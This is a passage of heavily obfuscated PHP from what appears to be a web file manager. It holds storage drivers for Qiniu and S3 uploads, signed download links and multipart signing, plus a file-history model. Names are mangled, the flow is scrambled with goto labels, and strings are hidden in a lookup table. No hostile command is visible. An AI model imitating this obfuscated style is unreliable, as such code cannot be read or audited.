$_SERVER[ÈİÅ¿ÈÈ¥×]; if (!($EÏõ¹Š¥ªæ = $this->link($F£«ùèÄ©é))) { return !1; } $D©ïÌ‡î¹ = !1; if ($d™ñÑ‘îïÖ > 0) { $C£ÆÔİÉÛµ = $aİ‘ëÓ¬ØÏ + $d™ñÑ‘îïÖ - 1; $D©ïÌ‡î¹ = array($aãÊ‹İÙ±¢[1269] . $aİ‘ëÓ¬ØÏ . $aãÊ‹İÙ±¢[428] . $C£ÆÔİÉÛµ); } $a˜‹ó–³¥¾ = url_request($EÏõ¹Š¥ªæ, $aãÊ‹İÙ±¢[224], !1, $D©ïÌ‡î¹); return $a˜‹ó–³¥¾[$aãÊ‹İÙ±¢[697]] ? $a˜‹ó–³¥¾[$aãÊ‹İÙ±¢[1052]] : !1; } public function upload($EíÙñî, $D»ÚÔéçÁ, $C£§Õ‚©‘Ò = false, $f³ÖŒº–â‡ = REPEAT_REPLACE) { $bÇÖÊŸ‚Ğ = new Qiniu\Storage\UploadManager(); $cªõ˜ÔÜøë = $this->auth->uploadToken($this->bucket, $EíÙñî); $AÁƒ´ÅŒÚÄ = get_file_mime(get_path_ext($D»ÚÔéçÁ)); list($A†æ‡øó¹ñ, $b½…ÂĞâÚ) = $bÇÖÊŸ‚Ğ->putFile($cªõ˜ÔÜøë, $EíÙñî, $D»ÚÔéçÁ, null, $AÁƒ´ÅŒÚÄ); return $b½…ÂĞâÚ ? !1 : $this->getPathOuter($EíÙñî); } public function uploadFormData($fÎ‚ÚÊ‚è, $D®©…àçÑ– = 3600) { return $this->uploadToken($fÎ‚ÚÊ‚è, $D®©…àçÑ–); } public function multiUploadFormData($e¹ÃçêĞàç, $e•İÔĞî… = 3600) { return $this->uploadToken($e¹ÃçêĞàç, $e•İÔĞî…); } private function uploadToken($cÕ–œƒÔ…, $F‡±¦»¼àÕ = 3600) { goto bË©Ÿ“‡å; bË©Ÿ“‡å: $A¡ ÔùÒå® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a­„‰«Š = $F‡±¦»¼àÕ; $dğšä÷·¦‰ = array($A¡ ÔùÒå®[1270] => $A¡ ÔùÒå®[1271]); goto f‚®à±¿ ·; e¹¨ôŒ„ˆœ: $D±ùÁÎ«ÃÒ = http_type() . "\72\57\57\x75\160\x6c\157\x61\x64{$aó ö®îº}\56\161\151\156\151\165\x70\56\143\x6f\x6d\57"; return array($A¡ ÔùÒå®[1273] => $E‘ğÁ¨Š£¢, $A¡ ÔùÒå®[1274] => $D±ùÁÎ«ÃÒ); goto AÖà§­Ğ“; f‚®à±¿ ·: $d“ğ»£ñŠ¡ = $cÕ–œƒÔ…; $E‘ğÁ¨Š£¢ = $this->auth->uploadToken($this->bucket, $d“ğ»£ñŠ¡, $a­„‰«Š, $dğšä÷·¦‰, !0); $aó ö®îº = empty($this->region) || $this->region == $A¡ ÔùÒå®[1272] ? $A¡ ÔùÒå®[33] : $A¡ ÔùÒå®[428] . $this->region; goto e¹¨ôŒ„ˆœ; AÖà§­Ğ“: } public function download($E„Ğ„›çÁ’, $cöÛÌ™šìœ) { goto dˆÙˆ·á“†; Fç»ËàÏÏ¦: $d¡µ¢´á¨‘ = 1024 * 200; $D’•«Üºš = fopen($C“ï´äã›ˆ, $_SERVER[ÈİÅ¿ÈÈ¥×][1275]); while (!0) { $DùóÇ˜ôèõ = $this->fileSubstr($E„Ğ„›çÁ’, $Dâß¿¤ºØ®, $d¡µ¢´á¨‘); if ($DùóÇ˜ôèõ === !1) { return !1; } fwrite($D’•«Üºš, $DùóÇ˜ôèõ); $Dâß¿¤ºØ® += $d¡µ¢´á¨‘; if (strlen($DùóÇ˜ôèõ) < $d¡µ¢´á¨‘) { break; } } goto aºï±«×Ã; dˆÙˆ·á“†: $C“ï´äã›ˆ = IO::getPathInner(IO::mkfile($cöÛÌ™šìœ)); if (!($bÖØ–Ãæï¦ = $this->link($E„Ğ„›çÁ’))) { return !1; } $Dâß¿¤ºØ® = 0; goto Fç»ËàÏÏ¦; aºï±«×Ã: fclose($D’•«Üºš); return $cöÛÌ™šìœ; goto a”ÇÂÊ¢±; a”ÇÂÊ¢±: } public function link($F¨çŸô•‡à, $BìÏ‡ÁÒÄ = '') { if (!$this->isFile($F¨çŸô•‡à)) { return !1; } $Aåš”²Â°É = $this->getHost() . $_SERVER[ÈİÅ¿ÈÈ¥×][8] . $this->pathEncode($F¨çŸô•‡à) . $BìÏ‡ÁÒÄ; return $this->auth->privateDownloadUrl($Aåš”²Â°É, 3600 * 12); } public function fileOut($f¥ˆÒ—©¿, $déÂ»›ß = false, $F¤ªİŒĞ = false, $F‰òÜ¼ç‡Ş = '') { $bÛï£ì‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->isFileOutServer()) { return $this->fileOutServer($f¥ˆÒ—©¿, $déÂ»›ß, $F¤ªİŒĞ, $F‰òÜ¼ç‡Ş); } if (!$F¤ªİŒĞ) { $F¤ªİŒĞ = $this->pathThis($f¥ˆÒ—©¿); } $E¤è£Äâ = $déÂ»›ß ? $bÛï£ì‚[1276] . rawurlencode($F¤ªİŒĞ) : $bÛï£ì‚[33]; $DùÃÚ²×í— = $this->link($f¥ˆÒ—©¿, $E¤è£Äâ); $this->fileOutLink($DùÃÚ²×í—); } public function fileOutServer($C’•°ğàß, $Eºğ™ÌÀŸ = false, $aß†Ç—’¶¢ = false, $FÍŸÒ×™˜ = '') { parent::fileOut($C’•°ğàß, $Eºğ™ÌÀŸ, $aß†Ç—’¶¢, $FÍŸÒ×™˜); } public function fileOutImage($f¥¿º‡›èù, $EÔ÷º©÷š÷ = 250) { $EÛÎ„¾˜ÒÑ = $this->link($f¥¿º‡›èù, $_SERVER[ÈİÅ¿ÈÈ¥×][1277] . $EÔ÷º©÷š÷); $this->fileOutLink($EÛÎ„¾˜ÒÑ); } public function fileOutImageServer($fß¥½¸È, $E”Ïæºª‰ù = 250) { parent::fileOutImage($fß¥½¸È, $E”Ïæºª‰ù); } public function hashMd5($cÈÃöè‘Ş) { $eªÚÊ¬äà =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d¶Õô×…íŸ = $this->objectMeta($cÈÃöè‘Ş); return isset($d¶Õô×…íŸ[$eªÚÊ¬äà[204]]) ? $d¶Õô×…íŸ[$eªÚÊ¬äà[204]] : !1; $Eªì¹š„´ = $this->link($cÈÃöè‘Ş, $eªÚÊ¬äà[1278]); } public function size($Eëê¥æºÈ£) { $A¶›õİòÀ¸ = $this->objectMeta($Eëê¥æºÈ£); return $A¶›õİòÀ¸ ? $A¶›õİòÀ¸[$_SERVER[ÈİÅ¿ÈÈ¥×][77]] : 0; } public function info($Bƒ¯°î¬ê–) { if ($this->isFolder($Bƒ¯°î¬ê–)) { return $this->folderInfo($Bƒ¯°î¬ê–); } else { if ($this->isFile($Bƒ¯°î¬ê–)) { return $this->fileInfo($Bƒ¯°î¬ê–); } } return !1; } public function exist($DÆ¢ÖÏ) { return $this->isFile($DÆ¢ÖÏ) || $this->isFolder($DÆ¢ÖÏ); } public function isFile($E„¸ğâ•Ôà) { return !$this->isFolder($E„¸ğâ•Ôà) && $this->objectMeta($E„¸ğâ•Ôà); } public function isFolder($dÂğÉ±ê’ğ) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][195], $dÂğÉ±ê’ğ); } protected function objectMeta($Aƒ·‰çÂ¼Œ) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][196], $Aƒ·‰çÂ¼Œ); } protected function _objectMeta($D¹ÎÖê©˜) { $F¦ëº¢ã±ó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; list($aâÃ–ß†¡Ş, $aƒàá¸á) = $this->bucketManager->stat($this->bucket, $D¹ÎÖê©˜); if ($aâÃ–ß†¡Ş) { $aâÃ–ß†¡Ş[$F¦ëº¢ã±ó[77]] = intval($aâÃ–ß†¡Ş[$F¦ëº¢ã±ó[1264]]); } return $aâÃ–ß†¡Ş; } protected function _isFolder($Fæ†™µÇä‰) { $e…÷·Å±¹ğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($Fæ†™µÇä‰ == $e…÷·Å±¹ğ[33] || $Fæ†™µÇä‰ == $e…÷·Å±¹ğ[8]) { return !0; } list($dÊ©óè‘ƒ¼, $dŞ·Á’„×Ê) = $this->bucketManager->listFiles($this->bucket, trim($Fæ†™µÇä‰, $e…÷·Å±¹ğ[8]) . $e…÷·Å±¹ğ[8], $e…÷·Å±¹ğ[33], 1, $e…÷·Å±¹ğ[8]); return !empty($dÊ©óè‘ƒ¼[$e…÷·Å±¹ğ[1267]]) || !empty($dÊ©óè‘ƒ¼[$e…÷·Å±¹ğ[1268]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($BÄ‡á°ôê) { parent::__construct($BÄ‡á°ôê); } public function uploadFormData($cÍĞĞ¨Œõ, $AÙãäšË—‡ = 3600) { goto Aè­ˆ›Ù†; eÕÛ”Â…Øò: $BœêˆŠì¡Ş = hash_hmac($a¸¸·ŒéĞ»[1194], $eÊ®å§æÀ«, $C†‰‚à°Ÿ‰, !0); $dÓíĞ„¥¯ = hash_hmac($a¸¸·ŒéĞ»[1194], $b­Î«‹È‹, $BœêˆŠì¡Ş, !0); $aµˆ‘ÏÙ‹‚ = hash_hmac($a¸¸·ŒéĞ»[1194], $AØßİ¡ğ‹¿, $dÓíĞ„¥¯); goto fÏ×”–ñËª; Aè­ˆ›Ù†: $a¸¸·ŒéĞ» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e’¼…á„Å­ = $a¸¸·ŒéĞ»[189]; $C×ğ£š¶ß = $a¸¸·ŒéĞ»[1184]; goto BŒ‘‘•ãšø; DÛÉÎ‰È÷à: $b­Î«‹È‹ = $a¸¸·ŒéĞ»[1186]; $F£Ìá¯¡ï¹ = $AÙãäšË—‡ . $a¸¸·ŒéĞ»[33]; $c«­µÎ—ƒ³ = $a¸¸·ŒéĞ»[1150]; goto D±ä¨¤Š¬ ; c»Ñ¯·†”¨: $AØßİ¡ğ‹¿ = base64_encode(json_encode($fÍÒœùÔ)); $B‘Úöë² = hash_hmac($a¸¸·ŒéĞ»[1194], $C¤íæÜï¼Ó, $a¸¸·ŒéĞ»[1195] . $this->secret, !0); $C†‰‚à°Ÿ‰ = hash_hmac($a¸¸·ŒéĞ»[1194], $this->region, $B‘Úöë², !0); goto eÕÛ”Â…Øò; BŒ‘‘•ãšø: $eÊ®å§æÀ« = $a¸¸·ŒéĞ»[59]; $B…“õ¢‘ã = gmdate($a¸¸·ŒéĞ»[1185]); $C¤íæÜï¼Ó = gmdate($a¸¸·ŒéĞ»[698]); goto DÛÉÎ‰È÷à; fÏ×”–ñËª: $cÅÄ¹›‚Ô = array($a¸¸·ŒéĞ»[207] => $a¸¸·ŒéĞ»[33], $a¸¸·ŒéĞ»[1196] => $a¸¸·ŒéĞ»[33], $a¸¸·ŒéĞ»[1154] => $e’¼…á„Å­, $a¸¸·ŒéĞ»[1158] => $c«­µÎ—ƒ³, $a¸¸·ŒéĞ»[1162] => $AØßİ¡ğ‹¿, $a¸¸·ŒéĞ»[1197] => $câ‚…ÖíÉ†, $a¸¸·ŒéĞ»[1198] => $C×ğ£š¶ß, $a¸¸·ŒéĞ»[1199] => $B…“õ¢‘ã, $a¸¸·ŒéĞ»[1200] => $F£Ìá¯¡ï¹, $a¸¸·ŒéĞ»[1201] => $aµˆ‘ÏÙ‹‚, $a¸¸·ŒéĞ»[173] => $this->getHost()); return $cÅÄ¹›‚Ô; goto Fõâ÷ñéÙÔ; D±ä¨¤Š¬ : $eÚµÒ÷øõó = array($this->accessKey, $C¤íæÜï¼Ó, $this->region, $eÊ®å§æÀ«, $b­Î«‹È‹); $câ‚…ÖíÉ† = implode($a¸¸·ŒéĞ»[8], $eÚµÒ÷øõó); $fÍÒœùÔ = array($a¸¸·ŒéĞ»[1152] => gmdate($a¸¸·ŒéĞ»[1151], strtotime($a¸¸·ŒéĞ»[1187])), $a¸¸·ŒéĞ»[1153] => array(array($a¸¸·ŒéĞ»[1155] => $this->bucket), array($a¸¸·ŒéĞ»[1154] => $e’¼…á„Å­), array($a¸¸·ŒéĞ»[1156], $a¸¸·ŒéĞ»[1157], $a¸¸·ŒéĞ»[33]), array($a¸¸·ŒéĞ»[1156], $a¸¸·ŒéĞ»[1188], $a¸¸·ŒéĞ»[33]), array($a¸¸·ŒéĞ»[1156], $a¸¸·ŒéĞ»[1189], $a¸¸·ŒéĞ»[33]), array($a¸¸·ŒéĞ»[1158] => $c«­µÎ—ƒ³), array($a¸¸·ŒéĞ»[1190] => $câ‚…ÖíÉ†), array($a¸¸·ŒéĞ»[1191] => $C×ğ£š¶ß), array($a¸¸·ŒéĞ»[1192] => $B…“õ¢‘ã), array($a¸¸·ŒéĞ»[1193] => $F£Ìá¯¡ï¹))); goto c»Ñ¯·†”¨; Fõâ÷ñéÙÔ: } public function multiUploadFormData($Aˆ¿…½—Áš, $bÖå”Ôî‘« = 3600) { $aÑÙ„Äêôè =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c­‡ºŒ‡áº = gmdate($aÑÙ„Äêôè[1279]); $EŒÆÏ“†Ãª = array(); $a§•éô¡­× = $this->client->getUploadId($this->bucket, $Aˆ¿…½—Áš, $EŒÆÏ“†Ãª); if (!$a§•éô¡­×) { return !1; } return array($aÑÙ„Äêôè[217] => $a§•éô¡­×, $aÑÙ„Äêôè[173] => $this->getHost() . $aÑÙ„Äêôè[8] . $this->pathEncode($Aˆ¿…½—Áš), $aÑÙ„Äêôè[218] => $c­‡ºŒ‡áº, $aÑÙ„Äêôè[89] => $Aˆ¿…½—Áš); } public function multiUploadAuthData($Fù”¥´«Ô, $F½ì…‡ÓîÓ = array()) { goto a·ÆñÂŒ´; B³Ãñ¡¶³: if (isset($F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[1280]])) { $b²š´˜‘‚†[$Fà¦õ¥ÀîÒ[1281]] = $F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[1280]]; } $f¯·±Ó·¾¹ = explode($Fà¦õ¥ÀîÒ[175], $this->getHost()); $FÎœÅœÒ£â = array($Fà¦õ¥ÀîÒ[1282] => $f¯·±Ó·¾¹[1], $Fà¦õ¥ÀîÒ[1283] => $Fà¦õ¥ÀîÒ[33], $Fà¦õ¥ÀîÒ[207] => $Fà¦õ¥ÀîÒ[116], $Fà¦õ¥ÀîÒ[1196] => $F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[77]]); goto f•õÚÚ˜—Ë; f•õÚÚ˜—Ë: $D¨ˆ¡êµÈ¦ = $Fà¦õ¥ÀîÒ[222]; $d•¢Ø„¿¢Ñ = $Fà¦õ¥ÀîÒ[8] . $this->pathEncode($B¡¼ó’®‘Ó) . $EÛğİŸŠ–Ö; $FóØîäìï¡ = $this->client->__getSignatureV4($b²š´˜‘‚†, $FÎœÅœÒ£â, $D¨ˆ¡êµÈ¦, $d•¢Ø„¿¢Ñ); goto Añ¹÷â„Ğ; a·ÆñÂŒ´: $Fà¦õ¥ÀîÒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÛğİŸŠ–Ö = isset($F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[165]]) ? $F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[165]] : $Fà¦õ¥ÀîÒ[33]; $B¡¼ó’®‘Ó = $F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[89]]; goto C…ÈÛ°àĞ‡; C…ÈÛ°àĞ‡: unset($F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[89]]); if (isset($F½ì…‡ÓîÓ[$Fà¦õ¥ÀîÒ[219]])) { return $this->listUploadParts($B¡¼ó’®‘Ó, $F½ì…‡ÓîÓ); } $b²š´˜‘‚† = array(); goto B³Ãñ¡¶³; Añ¹÷â„Ğ: if (strpos($EÛğİŸŠ–Ö, $Fà¦õ¥ÀîÒ[221]) === 0) { if (isset($b²š´˜‘‚†[$Fà¦õ¥ÀîÒ[1281]])) { $bëî˜÷Ôß­ = $b²š´˜‘‚†[$Fà¦õ¥ÀîÒ[1281]]; } else { if (isset($FóØîäìï¡[$Fà¦õ¥ÀîÒ[1281]])) { $bëî˜÷Ôß­ = $FóØîäìï¡[$Fà¦õ¥ÀîÒ[1281]]; } else { $bëî˜÷Ôß­ = hash($Fà¦õ¥ÀîÒ[1194], $Fà¦õ¥ÀîÒ[33]); } } return array($Fà¦õ¥ÀîÒ[228] => $FóØîäìï¡[$Fà¦õ¥ÀîÒ[228]], $Fà¦õ¥ÀîÒ[1281] => $bëî˜÷Ôß­, $Fà¦õ¥ÀîÒ[218] => $FóØîäìï¡[$Fà¦õ¥ÀîÒ[1284]]); } return $FóØîäìï¡[$Fà¦õ¥ÀîÒ[228]]; goto FğÕºÀ¾Ş¶; FğÕºÀ¾Ş¶: } public function listUploadParts($D¿ˆ™•êÉ©, $F´ä…Ó•¸¯ = array()) { goto Cïîó˜£Ç; EÌí¤ºš¡ê: $Aè­Ä£èõ = array($dóŠ±ë‚‡É[1282] => $f¬·»ÔÌùø[1], $dóŠ±ë‚‡É[207] => $dóŠ±ë‚‡É[116], $dóŠ±ë‚‡É[1196] => strlen($b–Æ¸‚¡à)); $fˆ”É¨ÀÁÛ = $dóŠ±ë‚‡É[220]; $cÀöÂ÷“˜³ = $dóŠ±ë‚‡É[8] . $this->pathEncode($D¿ˆ™•êÉ©) . $F´ä…Ó•¸¯[$dóŠ±ë‚‡É[165]]; goto eØ™‡Ë¬Ûä; cÉÂîÓİ•: if (!$DÈ¼ÖğÚË¸) { return !1; } $b–Æ¸‚¡à = $dóŠ±ë‚‡É[1285]; foreach ($DÈ¼ÖğÚË¸ as $B””Â’ÏèÃ) { $b–Æ¸‚¡à .= $dóŠ±ë‚‡É[1286] . "\x3c\120\x61\x72\164\116\x75\x6d\142\145\162\76{$B””Â’ÏèÃ[$dóŠ±ë‚‡É[1241]]}\x3c\57\x50\x61\x72\164\116\x75\x6d\x62\145\162\x3e\12" . "\74\105\x54\x61\x67\x3e{$B””Â’ÏèÃ[$dóŠ±ë‚‡É[1242]]}\74\x2f\x45\x54\x61\147\76\12" . $dóŠ±ë‚‡É[1287]; } goto EÊ¾ìÆĞ°†; Cïîó˜£Ç: $dóŠ±ë‚‡É =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b’„Š´ã¯¡ = str_replace($dóŠ±ë‚‡É[229], $dóŠ±ë‚‡É[33], $F´ä…Ó•¸¯[$dóŠ±ë‚‡É[165]]); $DÈ¼ÖğÚË¸ = $this->client->listParts($this->bucket, $D¿ˆ™•êÉ©, $b’„Š´ã¯¡); goto cÉÂîÓİ•; EÊ¾ìÆĞ°†: $b–Æ¸‚¡à .= $dóŠ±ë‚‡É[1288]; $f—º·ÄÄÎ = array(); $f¬·»ÔÌùø = explode($dóŠ±ë‚‡É[175], $this->getHost()); goto EÌí¤ºš¡ê; eØ™‡Ë¬Ûä: $dŒëœ…‹¨ = $this->client->__getSignatureV4($f—º·ÄÄÎ, $Aè­Ä£èõ, $fˆ”É¨ÀÁÛ, $cÀöÂ÷“˜³, $b–Æ¸‚¡à); return array($dóŠ±ë‚‡É[228] => $dŒëœ…‹¨[$dóŠ±ë‚‡É[228]], $dóŠ±ë‚‡É[218] => $dŒëœ…‹¨[$dóŠ±ë‚‡É[1284]], $dóŠ±ë‚‡É[230] => $DÈ¼ÖğÚË¸, $dóŠ±ë‚‡É[1281] => $dŒëœ…‹¨[$dóŠ±ë‚‡É[1281]]); goto d°é„ôŠîØ; d°é„ôŠîØ: } public function link($FˆÏƒà÷Š, $fËŠƒŞ‚¨ = array()) { return parent::link($FˆÏƒà÷Š, $fËŠƒŞ‚¨); } public function fileOut($f×Ì‹˜»“Ü, $dö¼¹ Üù = false, $f¸òä¼‚Ì¹ = false, $F®•­–¿£Ç = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÈİÅ¿ÈÈ¥×][1289])) { return parent::fileOutServer($f×Ì‹˜»“Ü, $dö¼¹ Üù, $f¸òä¼‚Ì¹, $F®•­–¿£Ç); } parent::fileOut($f×Ì‹˜»“Ü, $dö¼¹ Üù, $f¸òä¼‚Ì¹, $F®•­–¿£Ç); } public function fileOutImage($b±¹®«ÄªÖ, $a•Ø÷Ô¯êŸ = 250) { if (strstr($this->endpoint, $_SERVER[ÈİÅ¿ÈÈ¥×][1289])) { return parent::fileOutImageServer($b±¹®«ÄªÖ, $a•Ø÷Ô¯êŸ); } parent::fileOutImage($b±¹®«ÄªÖ, $a•Ø÷Ô¯êŸ); } public function fileOutLink($cèŞœŸ”šğ) { $eæ½îŠã‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (substr($cèŞœŸ”šğ, 0, 7) == $eæ½îŠã‚[1165]) { $cèŞœŸ”šğ = $eæ½îŠã‚[1166] . substr($cèŞœŸ”šğ, 7); } header($eæ½îŠã‚[156] . $cèŞœŸ”šğ); die; } public function getHost() { $eƒÊŠÖƒœÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D¡ö†í¨ = str_rtrim(parent::getHost(), $eƒÊŠÖƒœÎ[8] . $this->bucket); $D¡ö†í¨ = explode($eƒÊŠÖƒœÎ[175], $D¡ö†í¨); return $D¡ö†í¨[0] . $eƒÊŠÖƒœÎ[175] . $this->bucket . $eƒÊŠÖƒœÎ[91] . $D¡ö†í¨[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($e²Ö‘Çã¿Ğ, $A ›ˆİ§¾ = 0) { parent::__construct(); $this->source = $e²Ö‘Çã¿Ğ; $this->sourceSize = $A ›ˆİ§¾; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($d¡¶‘Êˆ¼ = false) { return $this->sourceSize; } public function getContent($DÈĞñƒ¦± = false) { return $this->fileSubstr($DÈĞñƒ¦±, 0, $this->sourceSize); } public function fileSubstr($cñ—‹œõÃÓ = false, $BŒ‰İ‡ÆŒË = 0, $EŠÚ“ŠÒ = 0) { if (!$EŠÚ“ŠÒ) { $EŠÚ“ŠÒ = $this->sourceSize; } $E×äøí´òç = $this->sourceSize - $BŒ‰İ‡ÆŒË; if ($EŠÚ“ŠÒ >= $E×äøí´òç) { $EŠÚ“ŠÒ = $E×äøí´òç; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $BŒ‰İ‡ÆŒË, $EŠÚ“ŠÒ); } if ($this->sourceType == self::TYPE_FILE) { if ($EŠÚ“ŠÒ <= 0) { return $_SERVER[ÈİÅ¿ÈÈ¥×][33]; } $FĞ­†›îÛÑ = ftell($this->source); fseek_64($this->source, $FĞ­†›îÛÑ + $BŒ‰İ‡ÆŒË); $bçÇˆ¹¥… = @fread($this->source, $EŠÚ“ŠÒ); fseek_64($this->source, $FĞ­†›îÛÑ); return $bçÇˆ¹¥…; } } public function hashMd5($D¤öšÍ×¡ = false) { return md5($this->getContent()); } public static function hash($B¯È¡ñ›­, $a˜‹ñÚ£  = 0) { $Dí…ÖÑ´¶ = new PathDriverStream($B¯È¡ñ›­, $a˜‹ñÚ£ ); return $Dí…ÖÑ´¶->hashSimple($B¯È¡ñ›­); } public static function md5($EÇßÚÜŒØ, $cÔ´ŞÇ«›Å = 0) { $AÍ¸´ğ¾­ = new PathDriverStream($EÇßÚÜŒØ, $cÔ´ŞÇ«›Å); return $AÍ¸´ğ¾­->hashMd5($EÇßÚÜŒØ); } } goto d¸Ö™‚ƒ÷; d©µ‡÷‚†·: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\x63\x65\137\x68\x69\x73\x74\157\162\x79"; public function historyCount($d¾š®Ÿï) { goto bÑùĞã¥®ø; bÑùĞã¥®ø: $C¢Ô©«›Ÿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$d¾š®Ÿï) { return array(); } if (is_string($d¾š®Ÿï) || is_int($d¾š®Ÿï)) { $d¾š®Ÿï = array($d¾š®Ÿï); } goto D´ËóŸ”‹; D´ËóŸ”‹: $c–Óƒ¼¯»™ = $C¢Ô©«›Ÿ[1879]; $EËò¦­ªÜ— = array($C¢Ô©«›Ÿ[385] => array($C¢Ô©«›Ÿ[7], $d¾š®Ÿï)); $C…¨²»‹¹ = $this->field($c–Óƒ¼¯»™)->where($EËò¦­ªÜ—)->group($C¢Ô©«›Ÿ[385])->select(); goto Eêæ¡ªÜè¥; Eêæ¡ªÜè¥: return array_to_keyvalue($C…¨²»‹¹, $C¢Ô©«›Ÿ[385], $C¢Ô©«›Ÿ[1683]); goto F·ßöÀ—Èæ; F·ßöÀ—Èæ: } public function addHistory($a·›É…í½È, $Cñ–‘êìñÙ = '') { $c±ÄÑ£›ÕÒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e…éºŠÜ¢Ø = array($c±ÄÑ£›ÕÒ[399] => $a·›É…í½È[$c±ÄÑ£›ÕÒ[385]], $c±ÄÑ£›ÕÒ[1482] => isset($a·›É…í½È[$c±ÄÑ£›ÕÒ[395]]) ? $a·›É…í½È[$c±ÄÑ£›ÕÒ[395]] : $a·›É…í½È[$c±ÄÑ£›ÕÒ[394]], $c±ÄÑ£›ÕÒ[436] => $a·›É…í½È[$c±ÄÑ£›ÕÒ[435]], $c±ÄÑ£›ÕÒ[537] => $a·›É…í½È[$c±ÄÑ£›ÕÒ[77]], $c±ÄÑ£›ÕÒ[1880] => $Cñ–‘êìñÙ); $bí£ìÃø·Æ = $GLOBALS[$c±ÄÑ£›ÕÒ[6]][$c±ÄÑ£›ÕÒ[84]][$c±ÄÑ£›ÕÒ[1067]]; if ($bí£ìÃø·Æ > 1) { $this->historyAutoClear($e…éºŠÜ¢Ø[$c±ÄÑ£›ÕÒ[385]]); $this->add($e…éºŠÜ¢Ø); } Hook::trigger($c±ÄÑ£›ÕÒ[1881], $e…éºŠÜ¢Ø); Model($c±ÄÑ£›ÕÒ[1882])->eventFileEdit($a·›É…í½È[$c±ÄÑ£›ÕÒ[385]]); } private function historyAutoClear($b¼­Ê÷ÆÍİ) { goto ašò„Ë; a’ª„Ìñ·: $this->where($fâîİòõÕÍ)->delete(); Model($F­”¬–õ¡ğ[438])->remove($cŞ·³„¼îÕ); goto a‡Áõ‡»°—; e–È°Æè¦„: $fâîİòõÕÍ = array($F­”¬–õ¡ğ[399] => $b¼­Ê÷ÆÍİ); $fÎÅ„±ØÑå = $this->field($F­”¬–õ¡ğ[1883])->where($fâîİòõÕÍ)->order($F­”¬–õ¡ğ[1876])->select(); if (!$fÎÅ„±ØÑå || $d¿Ì„ˆ¦Ø >= count($fÎÅ„±ØÑå)) { return; } goto d‰”Ÿ–Å¢ˆ; cšÍµËë: $cŞ·³„¼îÕ = array_slice($cŞ·³„¼îÕ, $d¿Ì„ˆ¦Ø); if (!$AƒëÊ’À || !$cŞ·³„¼îÕ) { return; } $fâîİòõÕÍ = array($F­”¬–õ¡ğ[401] => array($F­”¬–õ¡ğ[7], $AƒëÊ’À)); goto a’ª„Ìñ·; ašò„Ë: $F­”¬–õ¡ğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cæÎ¶²à« = Model($F­”¬–õ¡ğ[1087])->get($F­”¬–õ¡ğ[1088]); $Bğ•Ü¦‡š‰ = $GLOBALS[$F­”¬–õ¡ğ[6]][$F­”¬–õ¡ğ[84]][$F­”¬–õ¡ğ[1067]]; goto D­éÁ²ÃÇ‘; D­éÁ²ÃÇ‘: $d¿Ì„ˆ¦Ø = $cæÎ¶²à« == $F­”¬–õ¡ğ[1089] ? 5 : $Bğ•Ü¦‡š‰; if ($Bğ•Ü¦‡š‰ <= 1) { $d¿Ì„ˆ¦Ø = 1; } if ($d¿Ì„ˆ¦Ø >= 500) { return; } goto e–È°Æè¦„; d‰”Ÿ–Å¢ˆ: $AƒëÊ’À = array_to_keyvalue($fÎÅ„±ØÑå, $F­”¬–õ¡ğ[33], $F­”¬–õ¡ğ[383]); $AƒëÊ’À = array_slice($AƒëÊ’À, $d¿Ì„ˆ¦Ø); $cŞ·³„¼îÕ = array_to_keyvalue($fÎÅ„±ØÑå, $F­”¬–õ¡ğ[33], $F­”¬–õ¡ğ[435]); goto cšÍµËë; a‡Áõ‡»°—: } public function listData($Eç°ò¤İ¸) { goto eÊÇĞŠë›; aÜ¨®“¤±ß: $BïØ‰ ‚ìæ = 3; if ($a”âÚ»Ôòğ == $Fª†ñ‹˜Şà[1089]) { $c¥¯¼´«êÅ[$Fª†ñ‹˜Şà[361]] = array_slice($c¥¯¼´«êÅ[$Fª†ñ‹˜Şà[361]], 0, $BïØ‰ ‚ìæ); $c¥¯¼´«êÅ[$Fª†ñ‹˜Şà[358]] = array($Fª†ñ‹˜Şà[1885] => 1, $Fª†ñ‹˜Şà[1886] => 20, $Fª†ñ‹˜Şà[1887] => 1, $Fª†ñ‹˜Şà[1888] => count($c¥¯¼´«êÅ[$Fª†ñ‹˜Şà[361]])); } return $c¥¯¼´«êÅ; goto d˜‘‡„¯È; eÊÇĞŠë›: $Fª†ñ‹˜Şà =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e‹“ÔŒÒ‘Æ = array($Fª†ñ‹˜Şà[399] => $Eç°ò¤İ¸); $B¤‰¦ñØ…Ï = $Fª†ñ‹˜Şà[1884]; goto C¸ç ¥Á¿; C¸ç ¥Á¿: $c¥¯¼´«êÅ = $this->field($B¤‰¦ñØ…Ï)->where($e‹“ÔŒÒ‘Æ)->order($Fª†ñ‹˜Şà[1876])->selectPage(); 